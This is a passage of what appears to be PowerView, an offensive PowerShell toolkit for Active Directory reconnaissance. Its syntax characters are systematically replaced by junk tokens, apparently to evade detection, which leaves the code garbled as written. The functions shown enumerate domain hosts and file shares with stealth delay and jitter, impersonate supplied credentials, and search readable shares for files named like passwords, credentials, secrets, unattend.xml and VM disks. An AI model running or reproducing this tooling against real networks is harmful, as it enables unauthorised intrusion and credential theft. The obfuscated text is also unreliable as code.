        if (RaUPSBoundParameters[q4gUUserIdentityq4gU]) { RaUUserSearcherArguments[q4gUIdentityq4gU] = RaUUserIdentity }
        if (RaUPSBoundParameters[q4gUUserDomainq4gU]) { RaUUserSearcherArguments[q4gUDomainq4gU] = RaUUserDomain }
        if (RaUPSBoundParameters[q4gUUserLDAPFilterq4gU]) { RaUUserSearcherArguments[q4gULDAPFilterq4gU] = RaUUserLDAPFilter }
        if (RaUPSBoundParameters[q4gUUserSearchBaseq4gU]) { RaUUserSearcherArguments[q4gUSearchBaseq4gU] = RaUUserSearchBase }
        if (RaUPSBoundParameters[q4gUUserAdminCountq4gU]) { RaUUserSearcherArguments[q4gUAdminCountq4gU] = RaUUserAdminCount }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUUserSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUUserSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUUserSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUUserSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUUserSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUUserSearcherArguments[q4gUCredentialq4gU] = RaUCredential }

        if (RaUPSBoundParameters[q4gUUserIdentityq4gU] -or RaUPSBoundParameters[q4gUUserLDAPFilterq4gU] -or RaUPSBoundParameters[q4gUUserSearchBaseq4gU] -or RaUPSBoundParameters[q4gUUserAdminCountq4gU]) {
            RaUTargetUsers = Get-DomainUser @UserSearcherArguments wZ5t Select-Object -ExpandProperty samaccountname
        }
        elseif (RaUPSBoundParameters[q4gUUserGroupIdentityq4gU] -or (-not RaUPSBoundParameters[q4gUFilterq4gU])) {
            # otherwise weq4gUre querying a specific group
            RaUGroupSearcherArguments = @{
                q4gUIdentityq4gU = RaUUserGroupIdentity
                q4gURecurseq4gU = RaUTrue
            }
            Write-Verbose Oj8XUserGroupIdentity: RaUUserGroupIdentityOj8X
            if (RaUPSBoundParameters[q4gUUserDomainq4gU]) { RaUGroupSearcherArguments[q4gUDomainq4gU] = RaUUserDomain }
            if (RaUPSBoundParameters[q4gUUserSearchBaseq4gU]) { RaUGroupSearcherArguments[q4gUSearchBaseq4gU] = RaUUserSearchBase }
            if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUGroupSearcherArguments[q4gUServerq4gU] = RaUServer }
            if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUGroupSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
            if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUGroupSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
            if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUGroupSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
            if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUGroupSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
            if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUGroupSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
            RaUTargetUsers = Get-DomainGroupMember @GroupSearcherArguments wZ5t Select-Object -ExpandProperty MemberName
        }

        # build the set of computers to enumerate
        if (RaUPSBoundParameters[q4gUComputerNameq4gU]) {
            RaUTargetComputers = RaUComputerName
        }
        else {
            # if not -ComputerName is passed, query the current (or target) domain for domain controllers
            RaUDCSearcherArguments = @{
                q4gULDAPq4gU = RaUTrue
            }
            if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUDCSearcherArguments[q4gUDomainq4gU] = RaUDomain }
            if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUDCSearcherArguments[q4gUServerq4gU] = RaUServer }
            if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUDCSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
            Write-Verbose Oj8X[Find-DomainUserEvent] Querying for domain controllers in domain: RaUDomainOj8X
            RaUTargetComputers = Get-DomainController @DCSearcherArguments wZ5t Select-Object -ExpandProperty dnshostname
        }
        if (RaUTargetComputers -and (RaUTargetComputers -isnot [System.Array])) {
            RaUTargetComputers = @(,RaUTargetComputers)
        }
        Write-Verbose Oj8X[Find-DomainUserEvent] TargetComputers length: RaU(RaUTargetComputers.Length)Oj8X
        Write-Verbose Oj8X[Find-DomainUserEvent] TargetComputers RaUTargetComputersOj8X
        if (RaUTargetComputers.Length -eq 0) {
            throw q4gU[Find-DomainUserEvent] No hosts found to enumerateq4gU
        }

        # the host enumeration block weq4gUre using to enumerate all servers
        RaUHostEnumBlock = {
            Param(RaUComputerName, RaUStartTime, RaUEndTime, RaUMaxEvents, RaUTargetUsers, RaUFilter, RaUCredential)

            ForEach (RaUTargetComputer in RaUComputerName) {
                RaUUp = Test-Connection -Count 1 -Quiet -ComputerName RaUTargetComputer
                if (RaUUp) {
                    RaUDomainUserEventArgs = @{
                        q4gUComputerNameq4gU = RaUTargetComputer
                    }
                    if (RaUStartTime) { RaUDomainUserEventArgs[q4gUStartTimeq4gU] = RaUStartTime }
                    if (RaUEndTime) { RaUDomainUserEventArgs[q4gUEndTimeq4gU] = RaUEndTime }
                    if (RaUMaxEvents) { RaUDomainUserEventArgs[q4gUMaxEventsq4gU] = RaUMaxEvents }
                    if (RaUCredential) { RaUDomainUserEventArgs[q4gUCredentialq4gU] = RaUCredential }
                    if (RaUFilter -or RaUTargetUsers) {
                        if (RaUTargetUsers) {
                            Get-DomainUserEvent @DomainUserEventArgs wZ5t Where-Object {RaUTargetUsers -contains RaU_.TargetUserName}
                        }
                        else {
                            RaUOperator = q4gUorq4gU
                            RaUFilter.Keys wZ5t ForEach-Object {
                                if ((RaU_ -eq q4gUOpq4gU) -or (RaU_ -eq q4gUOperatorq4gU) -or (RaU_ -eq q4gUOperationq4gU)) {
                                    if ((RaUFilter[RaU_] -match q4gU&q4gU) -or (RaUFilter[RaU_] -eq q4gUandq4gU)) {
                                        RaUOperator = q4gUandq4gU
                                    }
                                }
                            }
                            RaUKeys = RaUFilter.Keys wZ5t Where-Object {(RaU_ -ne q4gUOpq4gU) -and (RaU_ -ne q4gUOperatorq4gU) -and (RaU_ -ne q4gUOperationq4gU)}
                            Get-DomainUserEvent @DomainUserEventArgs wZ5t ForEach-Object {
                                if (RaUOperator -eq q4gUorq4gU) {
                                    ForEach (RaUKey in RaUKeys) {
                                        if (RaU_.Oj8XRaUKeyOj8X -match RaUFilter[RaUKey]) {
                                            RaU_
                                        }
                                    }
                                }
                                else {
                                    # and all clauses
                                    ForEach (RaUKey in RaUKeys) {
                                        if (RaU_.Oj8XRaUKeyOj8X -notmatch RaUFilter[RaUKey]) {
                                            break
                                        }
                                        RaU_
                                    }
                                }
                            }
                        }
                    }
                    else {
                        Get-DomainUserEvent @DomainUserEventArgs
                    }
                }
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if (RaUPSBoundParameters[q4gUDelayq4gU] -or RaUPSBoundParameters[q4gUStopOnSuccessq4gU]) {

            Write-Verbose Oj8X[Find-DomainUserEvent] Total number of hosts: RaU(RaUTargetComputers.count)Oj8X
            Write-Verbose Oj8X[Find-DomainUserEvent] Delay: RaUDelay, Jitter: RaUJitterOj8X
            RaUCounter = 0
            RaURandNo = New-Object System.Random

            ForEach (RaUTargetComputer in RaUTargetComputers) {
                RaUCounter = RaUCounter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds RaURandNo.Next((1-RaUJitter)*RaUDelay, (1+RaUJitter)*RaUDelay)

                Write-Verbose Oj8X[Find-DomainUserEvent] Enumerating server RaUTargetComputer (RaUCounter of RaU(RaUTargetComputers.count))Oj8X
                RaUResult = Invoke-Command -ScriptBlock RaUHostEnumBlock -ArgumentList RaUTargetComputer, RaUStartTime, RaUEndTime, RaUMaxEvents, RaUTargetUsers, RaUFilter, RaUCredential
                RaUResult

                if (RaUResult -and RaUStopOnSuccess) {
                    Write-Verbose Oj8X[Find-DomainUserEvent] Target user found, returning earlyOj8X
                    return
                }
            }
        }
        else {
            Write-Verbose Oj8X[Find-DomainUserEvent] Using threading with threads: RaUThreadsOj8X

            # if weq4gUre using threading, kick off the script block with New-ThreadedFunction
            RaUScriptParams = @{
                q4gUStartTimeq4gU = RaUStartTime
                q4gUEndTimeq4gU = RaUEndTime
                q4gUMaxEventsq4gU = RaUMaxEvents
                q4gUTargetUsersq4gU = RaUTargetUsers
                q4gUFilterq4gU = RaUFilter
                q4gUCredentialq4gU = RaUCredential
            }

            # if weq4gUre using threading, kick off the script block with New-ThreadedFunction using the RaUHostEnumBlock + params
            New-ThreadedFunction -ComputerName RaUTargetComputers -ScriptBlock RaUHostEnumBlock -ScriptParameters RaUScriptParams -Threads RaUThreads
        }
    }
}


function Find-DomainShare {
<#
.SYNOPSIS

Searches for computer shares on the domain. If -CheckShareAccess is passed,
then only shares the current user has read access to are returned.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NetShare, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and enumerates the available shares for each
machine with Get-NetShare. If -CheckShareAccess is passed, then
[IO.Directory]::GetFiles() is used to check if the current user has read
access to the given share. If -Credential is passed, then
Invoke-UserImpersonation is used to impersonate the specified user before
enumeration, reverting after with Invoke-RevertToSelf.

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X. Useful for OU queries.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER CheckShareAccess

Switch. Only display found shares that the local user has access to.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-DomainShare

Find all domain shares in the current domain.

.EXAMPLE

Find-DomainShare -CheckShareAccess

Find all domain shares in the current domain that the current user has
read access to.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Find-DomainShare -Domain testlab.local -Credential RaUCred

Searches for domain shares in the testlab.local domain using the specified alternate credentials.

.OUTPUTS

PowerView.ShareInfo
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.ShareInfoq4gU)]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUDNSHostNameq4gU)]
        [String[]]
        RaUComputerName,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainq4gU)]
        [String]
        RaUComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUOperatingSystemq4gU)]
        [String]
        RaUComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUServicePackq4gU)]
        [String]
        RaUComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUSiteNameq4gU)]
        [String]
        RaUComputerSiteName,

        [Alias(q4gUCheckAccessq4gU)]
        [Switch]
        RaUCheckShareAccess,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Switch]
        RaUTombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        RaUDelay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        RaUJitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        RaUThreads = 20
    )

    BEGIN {

        RaUComputerSearcherArguments = @{
            q4gUPropertiesq4gU = q4gUdnshostnameq4gU
        }
        if (RaUPSBoundParameters[q4gUComputerDomainq4gU]) { RaUComputerSearcherArguments[q4gUDomainq4gU] = RaUComputerDomain }
        if (RaUPSBoundParameters[q4gUComputerLDAPFilterq4gU]) { RaUComputerSearcherArguments[q4gULDAPFilterq4gU] = RaUComputerLDAPFilter }
        if (RaUPSBoundParameters[q4gUComputerSearchBaseq4gU]) { RaUComputerSearcherArguments[q4gUSearchBaseq4gU] = RaUComputerSearchBase }
        if (RaUPSBoundParameters[q4gUUnconstrainedq4gU]) { RaUComputerSearcherArguments[q4gUUnconstrainedq4gU] = RaUUnconstrained }
        if (RaUPSBoundParameters[q4gUComputerOperatingSystemq4gU]) { RaUComputerSearcherArguments[q4gUOperatingSystemq4gU] = RaUOperatingSystem }
        if (RaUPSBoundParameters[q4gUComputerServicePackq4gU]) { RaUComputerSearcherArguments[q4gUServicePackq4gU] = RaUServicePack }
        if (RaUPSBoundParameters[q4gUComputerSiteNameq4gU]) { RaUComputerSearcherArguments[q4gUSiteNameq4gU] = RaUSiteName }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUComputerSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUComputerSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUComputerSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUComputerSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUComputerSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUComputerSearcherArguments[q4gUCredentialq4gU] = RaUCredential }

        if (RaUPSBoundParameters[q4gUComputerNameq4gU]) {
            RaUTargetComputers = RaUComputerName
        }
        else {
            Write-Verbose q4gU[Find-DomainShare] Querying computers in the domainq4gU
            RaUTargetComputers = Get-DomainComputer @ComputerSearcherArguments wZ5t Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose Oj8X[Find-DomainShare] TargetComputers length: RaU(RaUTargetComputers.Length)Oj8X
        if (RaUTargetComputers.Length -eq 0) {
            throw q4gU[Find-DomainShare] No hosts found to enumerateq4gU
        }

        # the host enumeration block weq4gUre using to enumerate all servers
        RaUHostEnumBlock = {
            Param(RaUComputerName, RaUCheckShareAccess, RaUTokenHandle)

            if (RaUTokenHandle) {
                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
                RaUNull = Invoke-UserImpersonation -TokenHandle RaUTokenHandle -Quiet
            }

            ForEach (RaUTargetComputer in RaUComputerName) {
                RaUUp = Test-Connection -Count 1 -Quiet -ComputerName RaUTargetComputer
                if (RaUUp) {
                    # get the shares for this host and check what we find
                    RaUShares = Get-NetShare -ComputerName RaUTargetComputer
                    ForEach (RaUShare in RaUShares) {
                        RaUShareName = RaUShare.Name
                        # RaURemark = RaUShare.Remark
                        RaUPath = q4gUScKjScKjq4gU+RaUTargetComputer+q4gUScKjq4gU+RaUShareName

                        if ((RaUShareName) -and (RaUShareName.trim() -ne q4gUq4gU)) {
                            # see if we want to check access to this share
                            if (RaUCheckShareAccess) {
                                # check if the user has access to this path
                                try {
                                    RaUNull = [IO.Directory]::GetFiles(RaUPath)
                                    RaUShare
                                }
                                catch {
                                    Write-Verbose Oj8XError accessing share path RaUPath : RaU_Oj8X
                                }
                            }
                            else {
                                RaUShare
                            }
                        }
                    }
                }
            }

            if (RaUTokenHandle) {
                Invoke-RevertToSelf
            }
        }

        RaULogonToken = RaUNull
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) {
            if (RaUPSBoundParameters[q4gUDelayq4gU] -or RaUPSBoundParameters[q4gUStopOnSuccessq4gU]) {
                RaULogonToken = Invoke-UserImpersonation -Credential RaUCredential
            }
            else {
                RaULogonToken = Invoke-UserImpersonation -Credential RaUCredential -Quiet
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if (RaUPSBoundParameters[q4gUDelayq4gU] -or RaUPSBoundParameters[q4gUStopOnSuccessq4gU]) {

            Write-Verbose Oj8X[Find-DomainShare] Total number of hosts: RaU(RaUTargetComputers.count)Oj8X
            Write-Verbose Oj8X[Find-DomainShare] Delay: RaUDelay, Jitter: RaUJitterOj8X
            RaUCounter = 0
            RaURandNo = New-Object System.Random

            ForEach (RaUTargetComputer in RaUTargetComputers) {
                RaUCounter = RaUCounter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds RaURandNo.Next((1-RaUJitter)*RaUDelay, (1+RaUJitter)*RaUDelay)

                Write-Verbose Oj8X[Find-DomainShare] Enumerating server RaUTargetComputer (RaUCounter of RaU(RaUTargetComputers.count))Oj8X
                Invoke-Command -ScriptBlock RaUHostEnumBlock -ArgumentList RaUTargetComputer, RaUCheckShareAccess, RaULogonToken
            }
        }
        else {
            Write-Verbose Oj8X[Find-DomainShare] Using threading with threads: RaUThreadsOj8X

            # if weq4gUre using threading, kick off the script block with New-ThreadedFunction
            RaUScriptParams = @{
                q4gUCheckShareAccessq4gU = RaUCheckShareAccess
                q4gUTokenHandleq4gU = RaULogonToken
            }

            # if weq4gUre using threading, kick off the script block with New-ThreadedFunction using the RaUHostEnumBlock + params
            New-ThreadedFunction -ComputerName RaUTargetComputers -ScriptBlock RaUHostEnumBlock -ScriptParameters RaUScriptParams -Threads RaUThreads
        }
    }

    END {
        if (RaULogonToken) {
            Invoke-RevertToSelf -TokenHandle RaULogonToken
        }
    }
}


function Find-InterestingDomainShareFile {
<#
.SYNOPSIS

Searches for files matching specific criteria on readable shares
in the domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NetShare, Find-InterestingFile, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and enumerates the available shares for each
machine with Get-NetShare. It will then use Find-InterestingFile on each
readhable share, searching for files marching specific criteria. If -Credential
is passed, then Invoke-UserImpersonation is used to impersonate the specified
user before enumeration, reverting after with Invoke-RevertToSelf.

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X. Useful for OU queries.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER Include

Only return files/folders that match the specified array of strings,
i.e. @(*.doc*, *.xls*, *.ppt*)

.PARAMETER SharePath

Specifies one or more specific share paths to search, in the form ScKjScKjCOMPUTERScKjShare

.PARAMETER ExcludedShares

Specifies share paths to exclude, default of CRaU, AdminRaU, PrintRaU, IPCRaU.

.PARAMETER LastAccessTime

Only return files with a LastAccessTime greater than this date value.

.PARAMETER LastWriteTime

Only return files with a LastWriteTime greater than this date value.

.PARAMETER CreationTime

Only return files with a CreationTime greater than this date value.

.PARAMETER OfficeDocs

Switch. Search for office documents (*.doc*, *.xls*, *.ppt*)

.PARAMETER FreshEXEs

Switch. Find .EXEs accessed within the last 7 days.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-InterestingDomainShareFile

Finds q4gUinterestingq4gU files on the current domain.

.EXAMPLE

Find-InterestingDomainShareFile -ComputerName @(q4gUwindows1.testlab.localq4gU,q4gUwindows2.testlab.localq4gU)

Finds q4gUinterestingq4gU files on readable shares on the specified systems.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUDEVScKjdfm.aq4gU, RaUSecPassword)
Find-DomainShare -Domain testlab.local -Credential RaUCred

Searches interesting files in the testlab.local domain using the specified alternate credentials.

.OUTPUTS

PowerView.FoundFile
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.FoundFileq4gU)]
    [CmdletBinding(DefaultParameterSetName = q4gUFileSpecificationq4gU)]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUDNSHostNameq4gU)]
        [String[]]
        RaUComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUOperatingSystemq4gU)]
        [String]
        RaUComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUServicePackq4gU)]
        [String]
        RaUComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUSiteNameq4gU)]
        [String]
        RaUComputerSiteName,

        [Parameter(ParameterSetName = q4gUFileSpecificationq4gU)]
        [ValidateNotNullOrEmpty()]
        [Alias(q4gUSearchTermsq4gU, q4gUTermsq4gU)]
        [String[]]
        RaUInclude = @(q4gU*password*q4gU, q4gU*sensitive*q4gU, q4gU*admin*q4gU, q4gU*login*q4gU, q4gU*secret*q4gU, q4gUunattend*.xmlq4gU, q4gU*.vmdkq4gU, q4gU*creds*q4gU, q4gU*credential*q4gU, q4gU*.configq4gU),

        [ValidateNotNullOrEmpty()]
        [ValidatePattern(q4gUScKjScKjScKjScKjq4gU)]
        [Alias(q4gUShareq4gU)]
        [String[]]
        RaUSharePath,

        [String[]]
        RaUExcludedShares = @(q4gUCRaUq4gU, q4gUAdminRaUq4gU, q4gUPrintRaUq4gU, q4gUIPCRaUq4gU),

        [Parameter(ParameterSetName = q4gUFileSpecificationq4gU)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        RaULastAccessTime,

        [Parameter(ParameterSetName = q4gUFileSpecificationq4gU)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        RaULastWriteTime,

        [Parameter(ParameterSetName = q4gUFileSpecificationq4gU)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        RaUCreationTime,

        [Parameter(ParameterSetName = q4gUOfficeDocsq4gU)]
        [Switch]
        RaUOfficeDocs,

        [Parameter(ParameterSetName = q4gUFreshEXEsq4gU)]
        [Switch]
        RaUFreshEXEs,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Switch]
        RaUTombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        RaUDelay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        RaUJitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        RaUThreads = 20
    )

    BEGIN {
        RaUComputerSearcherArguments = @{
            q4gUPropertiesq4gU = q4gUdnshostnameq4gU
        }
        if (RaUPSBoundParameters[q4gUComputerDomainq4gU]) { RaUComputerSearcherArguments[q4gUDomainq4gU] = RaUComputerDomain }
        if (RaUPSBoundParameters[q4gUComputerLDAPFilterq4gU]) { RaUComputerSearcherArguments[q4gULDAPFilterq4gU] = RaUComputerLDAPFilter }
        if (RaUPSBoundParameters[q4gUComputerSearchBaseq4gU]) { RaUComputerSearcherArguments[q4gUSearchBaseq4gU] = RaUComputerSearchBase }
        if (RaUPSBoundParameters[q4gUComputerOperatingSystemq4gU]) { RaUComputerSearcherArguments[q4gUOperatingSystemq4gU] = RaUOperatingSystem }
        if (RaUPSBoundParameters[q4gUComputerServicePackq4gU]) { RaUComputerSearcherArguments[q4gUServicePackq4gU] = RaUServicePack }
        if (RaUPSBoundParameters[q4gUComputerSiteNameq4gU]) { RaUComputerSearcherArguments[q4gUSiteNameq4gU] = RaUSiteName }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUComputerSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUComputerSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUComputerSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUComputerSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUComputerSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUComputerSearcherArguments[q4gUCredentialq4gU] = RaUCredential }

        if (RaUPSBoundParameters[q4gUComputerNameq4gU]) {
            RaUTargetComputers = RaUComputerName
        }
        else {
            Write-Verbose q4gU[Find-InterestingDomainShareFile] Querying computers in the domainq4gU
            RaUTargetComputers = Get-DomainComputer @ComputerSearcherArguments wZ5t Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose Oj8X[Find-InterestingDomainShareFile] TargetComputers length: RaU(RaUTargetComputers.Length)Oj8X
        if (RaUTargetComputers.Length -eq 0) {
            throw q4gU[Find-InterestingDomainShareFile] No hosts found to enumerateq4gU
        }

        # the host enumeration block weq4gUre using to enumerate all servers
        RaUHostEnumBlock = {
            Param(RaUComputerName, RaUInclude, RaUExcludedShares, RaUOfficeDocs, RaUExcludeHidden, RaUFreshEXEs, RaUCheckWriteAccess, RaUTokenHandle)

            if (RaUTokenHandle) {
                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
                RaUNull = Invoke-UserImpersonation -TokenHandle RaUTokenHandle -Quiet
            }

            ForEach (RaUTargetComputer in RaUComputerName) {

                RaUSearchShares = @()
                if (RaUTargetComputer.StartsWith(q4gUScKjScKjq4gU)) {
                    # if a share is passed as the server
                    RaUSearchShares += RaUTargetComputer
                }
                else {
                    RaUUp = Test-Connection -Count 1 -Quiet -ComputerName RaUTargetComputer
                    if (RaUUp) {
                        # get the shares for this host and display what we find
                        RaUShares = Get-NetShare -ComputerName RaUTargetComputer
                        ForEach (RaUShare in RaUShares) {
                            RaUShareName = RaUShare.Name
                            RaUPath = q4gUScKjScKjq4gU+RaUTargetComputer+q4gUScKjq4gU+RaUShareName
                            # make sure we get a real share name back
